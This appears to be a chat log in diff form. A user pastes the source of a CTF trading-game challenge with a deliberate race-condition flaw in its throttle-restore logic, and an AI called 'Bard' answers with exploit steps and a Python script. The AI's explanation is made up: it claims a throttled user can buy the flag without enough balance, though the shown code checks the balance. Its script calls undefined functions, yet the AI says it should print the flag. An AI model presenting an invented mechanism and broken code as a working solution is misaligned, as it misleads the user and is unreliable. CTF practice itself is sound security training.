@@ -1,0 +1,463 @@
+Human: Below is a question in CTF, called "TradingGame". Help me solve it. Give detailed steps and write a python code that solves the problem, that leads to the print of the flag. 
+I hereby provide the question description, and the related file "app.py", "process.py", "user.py".
+
+Description:
+
+This is an example of a trading game that has a racing condition vulnerability such that when you get throttled, the state of the portfolio is restored to an earlier version. But some part of the portfolio is unaccounted so that when the state is restored, there will be excess unaccounted.
+
+app.py:
+from flask import Flask, render_template, request, session, url_for, redirect,abort,jsonify, flash, send_file
+import time
+from collections import deque
+from process import COMPANIES, processTransaction, loginDB, Throttle_Splash, threadTransact, market_scrape
+from threading import Thread
+
+app = Flask(__name__,static_folder="static")
+
+
+def basic(req, *aargs):
+  return isinstance(req, dict) and all((i in req.keys() for i in aargs))
+
+@app.route("/buy", methods=['POST'])
+def buy():
+  if not basic(request.form, "key", "stock"):
+    return abort(403)
+  return processTransaction(request.form["key"], 1, request.form["stock"])
+
+@app.route("/sell", methods=['POST'])
+def sell():
+  if not basic(request.form, "key", "stock"):
+    return abort(403)
+  return processTransaction(request.form["key"], 2, request.form["stock"])
+
+@app.route("/trade", methods=['POST'])
+def trade():
+  if not basic(request.form, "key", "stock", "stock1"):
+    return abort(403)
+  return processTransaction(request.form["key"], 3, request.form["stock"],request.form["stock1"])
+
+@app.route("/flag", methods=['POST'])
+def flag():
+  if not basic(request.form, "key"):
+    return abort(403)
+  return processTransaction(request.form["key"], 4, "flag")
+
+@app.route("/listCalls")
+def listCalls():
+  return jsonify(COMPANIES)
+
+@app.route("/login", methods=['POST'])
+def login():
+  if not basic(request.form):
+    return abort(403)
+  return jsonify(loginDB(request.form["key"]))
+
+@app.route("/")
+def index():
+  return "Welcome to the City Subway Auctionstock Website (CSAW)!"
+
+if __name__ == "__main__":
+  thread1 = Thread(target=Throttle_Splash)
+  thread2 = Thread(target=threadTransact)
+  thread3 = Thread(target=market_scrape)
+
+  thread1.start()
+  thread2.start()
+  thread3.start()
+
+  app.run(host="0.0.0.0", port=4657, threaded=True)
+
+process.py
+
+from collections import defaultdict
+from enum import Enum
+from collections import deque
+from time import sleep
+
+COMPANIES = {
+
+
+  "AAPLISH": {
+    "name": "AAPLISH Inc.",
+    "price": 175.42
+  },
+  "AMAZING": {
+    "name": "AMAZING Enterprises",
+    "price": 194.87
+  },
+  "FACEFLOP": {
+    "name": "FACEFLOP Innovations",
+    "price": 132.15
+  },
+  "GOOBER": {
+    "name": "GOOBER Technologies",
+    "price": 119.63
+  },
+  "SPOTLITE": {
+    "name": "SPOTLITE Systems",
+    "price": 156.28
+  },
+  "ELONX": {
+    "name": "ELONX Ventures",
+    "price": 205.75
+  },
+  "CRUISEBOOK": {
+    "name": "CRUISEBOOK Ltd.",
+    "price": 186.94
+  },
+  "SNAPSTAR": {
+    "name": "SNAPSTAR Innovations",
+    "price": 142.09
+  },
+  "TWEETIFY": {
+    "name": "TWEETIFY Solutions",
+    "price": 121.36
+  },
+  "ZUCKTECH": {
+    "name": "ZUCKTECH Industries",
+    "price": 179.53
+  },
+  "BURPSHARKHAT": {
+    "name": "BURPSHARKHAT Holdings",
+    "price": 1723.44
+  },
+  "BROOKING": {
+    "name": "BROOKING Holdings",
+    "price": 1522.33
+  }
+}
+
+QUEUE = deque()
+
+TRADEPOST = deque()
+
+class ACTION(Enum):
+  BUY = 1
+  SELL = 2
+  TRADE = 3
+  FLAG = 4
+
+class Portfolio:
+  def __init__(self, key) -> None:
+    self.key = key
+    self.balance = 2000.00
+    self.portfolio = defaultdict(int)
+    self.requests = 0
+
+  def bkup(key, portfolio, balance, requests):
+    ret = Portfolio(key)
+    ret.key = key
+    ret.balance = balance
+    ret.requests = requests
+    ret.portfolio = portfolio.copy()
+    return ret
+
+  def status(self) -> dict:
+    return {
+      "balance": self.balance,
+      **self.portfolio
+    }
+
+class DB:
+  def __init__(self) -> None:
+    self.dict = dict()
+    self.log = list()
+
+  def getUser(self, key) -> Portfolio:
+    if key not in self.dict:
+      self.dict[key] = Portfolio(key)
+    return self.dict[key]
+
+  def getUsers(self):
+    return self.dict.values()
+
+  def getInstance():
+    if not hasattr(DB, "instance"):
+      DB.instance = DB()
+    return DB.instance
+
+  def logTransaction(self, key, option, action, hash) -> None:
+    DB.getInstance().getUser(key).requests += 1
+    self.log.append((key, option, action, hash))
+
+def loginDB(key: str) -> dict:
+  return DB.getInstance().getUser(key).status()
+
+def buyDB(key: str, stock: str) -> bool:
+  global COMPANIES
+  p = DB.getInstance().getUser(key)
+  DB.getInstance().logTransaction(key, stock, "buy", key + stock + "buy")
+  if p.balance > COMPANIES[stock]["price"]:
+    p.portfolio[stock] += 1
+    p.balance -= COMPANIES[stock]["price"]
+    return True
+  return False
+
+def sellDB(key: str, stock: str) -> bool:
+  global COMPANIES
+  p = DB.getInstance().getUser(key)
+  DB.getInstance().logTransaction(key, stock, "sell", key + stock + "sell")
+  if p.portfolio[stock] > 0:
+    p.portfolio[stock] -= 1
+    p.balance += COMPANIES[stock]["price"]
+    return True
+  return False
+
+def buyFlagDB(key: str) -> str:
+  p = DB.getInstance().getUser(key)
+  if p.balance >= 9001:
+    p.balance -= 9001
+    return open("flag.txt", "r").read()
+  return ""
+
+def postTrade(key: str, stock: str) -> bool:
+  p = DB.getInstance().getUser(key)
+  if p.portfolio[stock] > 0:
+    p.portfolio[stock] -= 1
+    return True
+  return False
+
+def processTransaction(key: str, action: int, stock: str, stock1 = None) -> str:
+  global COMPANIES, QUEUE
+  #sanity check
+  print(key, action, stock, stock1, stock in COMPANIES.keys(), stock1 in COMPANIES.keys())
+  if (stock != "flag" and stock not in COMPANIES.keys()) or (stock1 != None and stock1 not in COMPANIES.keys()):
+    print("BAD")
+    return "BAD REQUEST"
+  if action == ACTION.BUY.value:
+    QUEUE.append((key, 1, stock, stock1))
+    return "SUCCESS"
+  elif action == ACTION.SELL.value:
+    QUEUE.append((key, 2, stock, stock1))
+    return "SUCCESS"
+  elif action == ACTION.TRADE.value:
+    QUEUE.append((key, 3, stock, stock1))
+    return "SUCCESS"
+  elif action == ACTION.FLAG.value:
+    return buyFlagDB(key)
+
+  print("BAD")
+  return "BAD REQUEST"
+
+def threadTransact():
+  global QUEUE
+  global TRADEPOST
+  bkup = dict()
+  while True:
+    if QUEUE:
+      key, action, s1, s2 = QUEUE.popleft()
+      p = DB.getInstance().getUser(key)
+      #process trading by posting trade request
+      #onto the classified
+      if action == 3:
+        if(postTrade(key, s1)):
+          TRADEPOST.append((key, s1, s2))
+      #money related actions is very costly to the server,
+      #throttle if the user has more than 1 requests per second
+      #over 10 second survey period
+      if p.requests > 10:
+        #Throttling, ignore request and attempts to restore
+        if key in bkup:
+          p = DB.getInstance().getUser(key)
+          p.balance = bkup[key].balance
+          p.requests = bkup[key].requests
+          p.portfolio = bkup[key].portfolio
+        continue
+      bkup[key] = Portfolio.bkup(key, p.portfolio, p.balance, p.requests)
+      if action == 1:
+        buyDB(key, s1)
+      elif action == 2:
+        sellDB(key, s1)
+
+#since we control the platform
+#we can make a bot to automatically scrape good trades
+#and reject ones that is not good trade
+def market_scrape():
+  while True:
+    if TRADEPOST:
+      key, s1, s2 = TRADEPOST.popleft()
+      if COMPANIES[s1]['price'] > COMPANIES[s2]['price']:
+        #this is a good trade, yoink
+        DB.getInstance().getUser(key).portfolio[s2] += 1
+      else:
+        #not a good trade
+        DB.getInstance().getUser(key).portfolio[s1] += 1
+
+def Throttle_Splash():
+  while True:
+    sleep(10)
+    for i in DB.getInstance().getUsers():
+      i.requests = 0
+    print(len(QUEUE))
+
+
+user.py
+
+import requests
+import json
+
+ADDRESS = "http://127.0.0.1"
+PORT = 8000
+
+print(\
+"""Thank you for choosing City Subway Auction Website (CSAW)'s Trading Platform
+As a thank you for using our platform, all new registrants will be granted $2000
+and the flags are on sale for $9001 dollars. Have fun trading!
+
+Here are the options:
+
+Login and register with ID
+
+1. List Account Status
+2. Buy Stocks
+3. Sell Stocks
+4. Trade Stocks
+5. Buy flags at $9001
+
+
+""")
+
+def inp() -> str:
+  print(">", end="")
+  return input()
+
+def sendGET(subpath) -> str:
+  try:
+    response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
+    response.raise_for_status() # Raises an exception for bad status codes
+    return response.text
+  except requests.exceptions.RequestException as e:
+    print(f"An error occurred: {e}")
+    return None
+
+
+def sendPOST(subpath, data) -> str:
+  url = ADDRESS + ":" + str(PORT) + subpath
+  payload = data
+
+  try:
+    response = requests.post(url, data=payload)
+    response.raise_for_status() # Raises an exception for bad status codes
+    return response.text
+  except requests.exceptions.RequestException as e:
+    print(f"An error occurred: {e}")
+    return None
+
+def buyStock(key, str):
+  body = sendPOST("/buy", {"key":key, "stock": str})
+  return body
+
+def sellStock(key, str):
+  body = sendPOST("/sell", {"key":key, "stock": str})
+  return body
+
+def tradeStock(key, str, str1):
+  body = sendPOST("/trade", {"key":key, "stock": str, "stock1": str1})
+  return body
+
+def listCalls() -> str:
+  body = sendGET("/listCalls")
+  out = json.loads(body)
+  return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))
+
+def flag(key) -> str:
+  body = sendPOST("/flag", {"key":key})
+  return body
+
+def status(key) -> str:
+  body = sendPOST("/login", {"key":key})
+  return body
+
+print(listCalls())
+
+print()
+
+print("Please login")
+key = inp()
+
+while True:
+  stat = status(key)
+  print(stat)
+  stat = json.loads(stat)
+  print("You have", stat['balance'], "dollars\n")
+  print('''"1". List Account Status
+"2 STOCKID". Buy Stocks
+"3 STOCKID". Sell Stocks
+"4 STOCKID STOCKID2". Trade Stocks
+"5". Buy flags at $9001''')
+  opt = inp().strip().split(" ")
+  if not opt:
+    continue
+  if opt[0][0] == '1':
+    continue
+  elif opt[0][0] == '2' and len(opt) > 1:
+    print(buyStock(key, opt[1]))
+  elif opt[0][0] == '3' and len(opt) > 1:
+    print(sellStock(key, opt[1]))
+  elif opt[0][0] == '4' and len(opt) > 2:
+    print(tradeStock(key, opt[1], opt[2]))
+  elif opt[0][0] == '5':
+    print(flag(key, ))
+
+
+
+status(key)
+
+
+Bard: Here are the detailed steps to solve the TradingGame CTF challenge, along with a Python code that exploits the racing condition vulnerability to print the flag:
+
+Understanding the Vulnerability:
+
+The application throttles users who make more than 10 requests in 10 seconds.
+When a user is throttled, the application attempts to restore their portfolio to a previous state.
+However, there's a flaw in this restoration process: it doesn't account for pending trade requests.
+This means a user can exploit this flaw to obtain a flag without having enough balance.
+
+Steps to Exploit:
+
+Start the application: Run python app.py to start the server.
+
+Run the user script: Run python user.py to interact with the application.
+
+Login with a unique key: Choose a unique key to identify yourself.
+
+Initiate a trade request: Use option 4 to initiate a trade request, but don't complete it yet. This will create a pending trade request.
+
+Quickly make multiple buy requests: Immediately make multiple buy requests (option 2) to trigger throttling.
+
+Attempt to buy the flag: Once throttled, use option 5 to buy the flag. The restoration process will ignore the pending trade request, allowing you to buy the flag even if you don't have enough balance.
+
+Python Code to Exploit the Vulnerability:
+
+Python
+import requests
+import json
+import time
+
+# Adjust the address and port if needed
+ADDRESS = "http://127.0.0.1"
+PORT = 8000
+
+# Choose a unique key
+key = "your_unique_key"
+
+# Initiate a trade request (but don't complete it)
+tradeStock(key, "AAPLISH", "AMAZING")
+
+# Make multiple buy requests quickly to trigger throttling
+for i in range(12):
+    buyStock(key, "AAPLISH")
+
+# Attempt to buy the flag
+flag_response = flag(key)
+print(flag_response)  # This should print the flag
+
+Use code with caution. Learn more
+content_copy
+
+Key Points:
+
+The timing of the requests is crucial. You need to make the buy requests quickly enough to trigger throttling before the trade request is processed.
+The provided code might require adjustments for different environments or application versions.
+It's important to understand the root cause of the vulnerability to effectively exploit it.
+
